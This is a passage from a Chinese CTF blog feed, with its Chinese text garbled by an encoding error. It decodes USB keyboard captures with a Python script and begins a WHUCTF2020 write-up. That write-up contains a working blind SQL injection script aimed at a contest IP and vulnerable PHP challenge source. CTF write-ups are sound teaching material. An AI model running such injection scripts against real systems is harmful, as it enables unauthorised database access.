python-tk<br></code></pre></td></tr></table></figure></li><li><p>é”®ç›˜æµé‡å–è¯</p><blockquote><p>é”®ç›˜æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œå’Œå‡»é”®ä¿¡æ¯è¢«é›†ä¸­åœ¨ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼Œæ¯æ¬¡key strokeéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªkeyboard event usb packetã€‚</p></blockquote><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™ä¸ªå€¼ä¸å…·ä½“é”®ä½çš„å¯¹åº”å…³ç³»ï¼š<a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a></p><p><img src="https://img.tucang.cc/api/image/show/5f7cc8d56e2f35b5782d89c4ea3e43f8" alt="img"></p><p>åŒæ ·åœ°ï¼Œæˆ‘ä»¬ç”¨ Wireshark æŠ“å–äº†æˆ‘ä»¬ usb é”®ç›˜çš„æµé‡ï¼Œä¿å­˜ä¸º kb.pcapngï¼Œå½“æ²¡æœ‰ä»€ä¹ˆæ··æ·†çš„æ—¶å€™ï¼Œå…¶å®ç¡¬çœ‹ä¹Ÿæ˜¯å¯ä»¥ä¸€ç‚¹ä¸€ç‚¹çœ‹å‡ºæ¥çš„ï¼Œå½“æ—¶å†™ SarCTF çš„æ—¶å€™ï¼Œæˆ‘è¿˜æ˜¯å…ˆç¡¬çœ‹å‡ºæ¥æœ€åæ‰å†™çš„è„šæœ¬ã€‚ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#é”®ç›˜æ•°æ®è½¬æ¢ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯æ²¡æœ‰ç”¨:åˆ†å‰²çš„ç‰ˆæœ¬</span><br>FILE = <span class="hljs-string">&quot;data&quot;</span><br><br>switcher = &#123;<br><span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-comment"># or A</span><br><span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-comment"># or B</span><br><span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-comment"># or C</span><br><span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-comment"># or D</span><br><span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-comment"># or E</span><br><span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-comment"># or F</span><br><span class="hljs-string">&quot;0A&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-comment"># or G</span><br><span class="hljs-string">&quot;0B&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-comment"># or H</span><br><span class="hljs-string">&quot;0C&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-comment"># or I</span><br><span class="hljs-string">&quot;0D&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-comment"># or J</span><br><span class="hljs-string">&quot;0E&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-comment"># or K</span><br><span class="hljs-string">&quot;0F&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-comment"># or L</span><br><span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-comment"># or M</span><br><span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-comment"># or N</span><br><span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-comment"># or O</span><br><span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-comment"># or P</span><br><span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-comment"># or Q</span><br><span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-comment"># or R</span><br><span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-comment"># or S</span><br><span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-comment"># or T</span><br><span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-comment"># or U</span><br><span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-comment"># or V</span><br><span class="hljs-string">&quot;1A&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-comment"># or W</span><br><span class="hljs-string">&quot;1B&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-comment"># or X</span><br><span class="hljs-string">&quot;1C&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-comment"># or Y</span><br><span class="hljs-string">&quot;1D&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-comment"># or Z</span><br><span class="hljs-string">&quot;1E&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-comment"># or !</span><br><span class="hljs-string">&quot;1F&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-comment"># or @</span><br><span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-comment"># or #</span><br><span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-comment"># or $</span><br><span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-comment"># or %</span><br><span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-comment"># or ^</span><br><span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-comment"># or &amp;</span><br><span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-comment"># or *</span><br><span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-comment"># or (</span><br><span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-comment"># or )</span><br><span class="hljs-string">&quot;2D&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-comment"># or _</span><br><span class="hljs-string">&quot;2E&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-comment"># or =</span><br><span class="hljs-string">&quot;2F&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-comment"># or &#123;</span><br><span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-comment"># or &#125;</span><br><span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-comment"># or |</span><br><span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-comment"># or :</span><br><span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-comment"># or &quot;</span><br><span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-comment"># or ~</span><br><span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-comment"># or &lt;</span><br><span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-comment"># or &gt;</span><br><span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-comment"># or ?</span><br>&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(FILE) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data:<br>    byte = line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>].upper()<br>    <span class="hljs-keyword">if</span> byte <span class="hljs-keyword">in</span> switcher:<br>        <span class="hljs-built_in">print</span>(switcher[byte], end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/1bf55324946f2e73417d8771b63e9f52" alt="image-20200920234730353"></p><p><img src="https://img.tucang.cc/api/image/show/4b3fb92743a877418f948245fcfae296" alt="image-20200920234751692"></p><p><img src="https://img.tucang.cc/api/image/show/6227ee4cc0467ce3edaffbdaccd19262" alt="image-20200920234809014"></p><p><img src="https://img.tucang.cc/api/image/show/90ec3ea9d0b3fd4f71ba3433433acd09" alt="image-20200920234821077"></p></li></ul><p>æ¯”å¦‚æˆ‘ä»¬çœ‹å‰å››ä¸ªï¼Œå¯¹ç…§è¡¨ï¼Œå°±å¯ä»¥ç¿»è¯‘å‡ºå‰å››ä¸ªå­—ç¬¦æ˜¯ <code>flag</code>ï¼Œå› æ­¤å¾€åç»§ç»­è¯†åˆ«å°±å¯ä»¥äº†ã€‚</p><p>è·‘ä¸€éè„šæœ¬ï¼Œæ–¹æ‹¬å·å’ŒèŠ±æ‹¬å·æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤æäº¤çš„æ—¶å€™è‡ªè¡Œä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/8c0336083b03a06083e1227713dbbeb9" alt="image-20200920235644178"></p><p>å½“ç„¶ä¹Ÿæœ‰ç°æˆçš„é¡¹ç›®ï¼Œ<code>https://github.com/WangYihang/UsbKeyboardDataHacker</code></p><p>ä¸‹è½½ <code>git clone https://github.com/WangYihang/UsbKeyboardDataHacker</code></p><p>ä½¿ç”¨ <code>python UsbKeyboardDataHacker.py kb.pcapng</code></p><p><img src="https://img.tucang.cc/api/image/show/8d9c3a7de4eb3887c0e915e4a199a2da" alt="image-20200920235909296"></p><p>å¯¹äº SarCTF çš„é¢˜ç›®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬è·‘å‡ºæ¥ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/a9cd84cd6f7be2de83e879fc0bd42923" alt="image-20200921000040861"></p><p>å½“ç„¶è¿˜æœ‰ä¸€äº›å¸ˆå‚…è‡ªå·±æ•´åˆäº†ä¸€äº›æƒ…å†µçš„è„šæœ¬ï¼š</p><p>[<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html">æ·±å…¥ç†è§£USBæµé‡æ•°æ®åŒ…çš„æŠ“å–ä¸åˆ†æ</a>]</p><p>è¿˜æœ‰ä¸€äº›å­¦ä¹ çš„æ–‡ç« ï¼š</p><p><a href="https://www.anquanke.com/post/id/85218">ä»CTFä¸­å­¦USBæµé‡æ•è·ä¸è§£æ</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/misc/traffic/protocols/USB/">CTF-Wiki</a></p><p><a href="https://www.rootusers.com/google-ctf-2016-forensic-for2-write-up/">Google CTF 2016 â€“ Forensic â€œFor2â€ Write-up</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WHUCTF2020 Writeup</title>
    <link href="/2020/05/26/whuctf2020_writeup/"/>
    <url>/2020/05/26/whuctf2020_writeup/</url>
    
    <content type="html"><![CDATA[<p>å‡†å¤‡è€ƒç ”å»äº†ï¼Œå¾ˆä¹…æ²¡æœ‰å†™è¿‡åšå®¢ï¼ŒåŒ…æ‹¬ç½‘é¼æ¯çš„ <code>Writeup</code> ä¹Ÿå’•å’•å’•äº†ï¼Œåˆšå¥½æœ€è¿‘æœ‰ä¸ªæ­¦å¤§çš„æ¯”èµ›ï¼Œé—²æ¥å°±åšäº†ä¸€ä¸‹ï¼Œå¤ªä¹…æ²¡æ‰“ï¼Œåªä¼šåš <code>easy</code> é¢˜ç›®äº†ï¼Œæœ‰äº›é¢˜ç›®è¿˜æ˜¯è›®æœ‰æ„æ€çš„ï¼Œåªå†™äº†å’Œ  <code>Web</code> ç›¸å…³çš„å‡ é¢˜ã€‚</p><h1 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h1><p>æ‰“å¼€å°±æ˜¯ç™»é™†æ¡†ï¼Œè¯•äº†ä¸‡èƒ½å¯†ç å‘ç°æœ‰ <code>Login success!</code>ï¼Œä½†æ˜¯ç•Œé¢è¿˜æ˜¯ä¸»é¡µï¼Œåº”è¯¥åé¢å°±æ²¡æœ‰ä»€ä¹ˆé€»è¾‘äº†ï¼Œè¿˜çˆ†å‡ºäº†æ‰§è¡Œçš„ <code>sql</code> è¯­å¥ï¼Œéå¸¸è´´å¿ƒï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Your <span class="hljs-keyword">sql</span> statement <span class="hljs-keyword">is</span>: <span class="hljs-keyword">SELECT</span> password <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<span class="hljs-string">&#x27; AND password=&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°å¯¹ä¸€äº›å…³é”®è¯è¿›è¡Œäº†è¿‡æ»¤ï¼Œå…³é”®è¯è¢«æ›¿æ¢æˆç©ºï¼Œç›®å‰æ ¹æ®è‡ªå·±çš„è§£æ³•å‘ç°äº† <code>from</code>ï¼Œ <code>select</code>ï¼Œ <code>or</code>ï¼Œ <code>where</code>ï¼Œé‡‡å–åŒå†™ç»•è¿‡å³å¯ã€‚ç„¶åå‘ç°åªè¦ <code>sql</code> è¯­å¥æ˜¯å¯¹äº†ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ <code>Login success!</code>ï¼Œç›²æ³¨è§£ä¸€æ³¢å°±å‡ºæ¥äº†ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># admin&#x27; and exists(seleselectct * frfromom users)#</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> *<br><br>alphabet = [<span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># WHUCTF&#123;r3lly_re11y_n0t_d1ffIcult_yet??~&#125;</span><br><span class="hljs-comment"># from, select, or, where</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-comment">#for char in alphabet:</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):<br><span class="hljs-comment"># information_schema,easy_sql1,mysql,performance_schema</span><br><span class="hljs-comment"># payload = &quot;selselectect group_concat(schema_name) ffromrom infoorrmation_schema.schemata&quot;</span><br><br><span class="hljs-comment"># f1ag_y0u_wi1l_n3ver_kn0w,user</span><br><span class="hljs-comment"># payload = &quot;seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()&quot; </span><br><br><span class="hljs-comment"># f111114g,id,username,password</span><br><span class="hljs-comment"># payload = &#x27;seleselectct group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database()&#x27;</span><br><br>payload = <span class="hljs-string">&quot;seselectlect group_concat(f111114g) frfromom f1ag_y0u_wi1l_n3ver_kn0w&quot;</span><br>data = &#123;<br><span class="hljs-string">&quot;pass&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&#x27; and (ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(payload, i, char)<br>&#125;<br>url = <span class="hljs-string">&#x27;http://218.197.154.9:10011/login.php&#x27;</span><br>r = requests.post(url=url, data=data)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success!&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>res += <span class="hljs-built_in">chr</span>(char)<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">break</span><br><span class="hljs-comment"># print(r.content)</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸ªå°æ’æ›²ï¼Œæˆ‘å­—ç¬¦é›†é‡Œé¢æ²¡æœ‰ <code>?</code> å’Œ <code>~</code>ï¼Œæå¾—æˆ‘å¾ˆè¿·æƒ‘ï¼Œé—®äº†ä¸€ä¸‹å‡ºé¢˜äººï¼Œåœ°æ–¹æ˜¯å¯¹çš„ä½†æ˜¯ <code>flag</code> ä¸æ­£ç¡®ï¼Œé‚£å°±æ˜¯å­—ç¬¦çš„é—®é¢˜ï¼Œåæ¥ç›´æ¥ç”¨ <code>ascii</code> è¡¨è·‘å°±å‡ºæ¥äº†ã€‚</p><h1 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h1><p>php çš„ä»£ç å®¡è®¡ï¼Œæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$string_1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str1&#x27;</span>];<br><span class="hljs-variable">$string_2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str2&#x27;</span>];<br><br><span class="hljs-comment">//1st</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;1st ok&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¼šä»£ç å®¡è®¡å˜›23333&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//2nd</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$string_1</span>))&#123;<br>    <span class="hljs-variable">$md5_1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$string_1</span>);<br>    <span class="hljs-variable">$md5_2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$string_2</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$md5_1</span> != <span class="hljs-variable">$md5_2</span>)&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_1</span>, <span class="hljs-string">&#x27;pggnb&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span>);<br>        <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_2</span>, <span class="hljs-string">&#x27;pggnb&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;2nd ok&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can u give me the right str???&quot;</span>);<br>        &#125;<br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!!!!!!!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;is str1 numeric??????&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//3nd</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/x/&#x27;</span>, <span class="hljs-string">&#x27;yy&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;aaaaa&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$r</span>)[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;123456&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°å‰ä¸¤å…³å°±çœ‹å‡ºæ¥æ˜¯å—é‚®2019çš„åŸé¢˜äº†ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªç»•è¿‡ï¼š</p><ol><li>ä¼ å…¥çš„ <code>num</code> çš„å€¼ä¸å¯ä»¥ç­‰äº <code>23333 </code>ï¼Œå¹¶ä¸”è¿™ä¸ªå€¼è¦è¢«æ­£åˆ™è¡¨è¾¾å¼ <code>/^23333$/</code> 